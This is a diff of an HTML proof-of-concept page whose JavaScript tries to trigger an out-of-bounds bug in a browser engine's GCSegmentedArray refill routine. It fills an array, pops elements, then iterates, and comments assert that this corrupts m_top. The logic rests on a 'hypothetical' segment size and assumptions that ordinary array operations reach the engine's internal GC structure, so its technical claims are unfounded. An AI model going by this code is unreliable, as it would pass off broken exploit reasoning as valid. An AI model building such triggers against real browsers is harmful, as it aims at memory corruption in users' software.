@@ -6,23 +6,35 @@
 <body>
 <script>
 (function() {
-    // Function to create a scenario that triggers the bug
     function triggerBug() {
-        // Create a large array to fill the GCSegmentedArray
+        // Step 1: Fill the segmented array to create multiple segments
         let arr = [];
-        for (let i = 0; i < 100000; i++) {
+        const segmentCapacity = 1024; // Hypothetical value
+        const numSegments = 5;
+        const totalElements = segmentCapacity * numSegments - 500; // Leave last segment partially filled
+
+        for (let i = 0; i < totalElements; i++) {
             arr.push(i);
         }
 
-        // Force garbage collection to empty the segments
-        arr = null;
+        // Step 2: Remove elements to empty the current segment
+        for (let i = 0; i < segmentCapacity; i++) {
+            arr.pop();
+        }
 
-        // Perform operations that cause refill to be called
-        // under conditions where m_numberOfSegments == 1 and m_top == 0
-        // For example, manipulating regular expressions or large strings
-        let pattern = /a*b*c*/;
-        let str = 'abc'.repeat(1000000);
-        pattern.test(str);
+        // Step 3: Force the refill operation
+        // Assume that certain operations in the JS engine will cause refill() to be called
+        // For example, accessing an element that triggers internal mechanisms
+        arr.push(0); // Append to potentially trigger refill
+
+        // Step 4: Access elements to cause out-of-bounds access due to incorrect m_top
+        for (let i = 0; i < arr.length; i++) {
+            let value = arr[i];
+            // Perform operations with value to prevent optimization
+            if (value === -1) {
+                console.log('This will never happen.');
+            }
+        }
     }
 
     // Run the test and catch any potential errors
@@ -37,4 +49,3 @@
 </script>
 </body>
 </html>
-
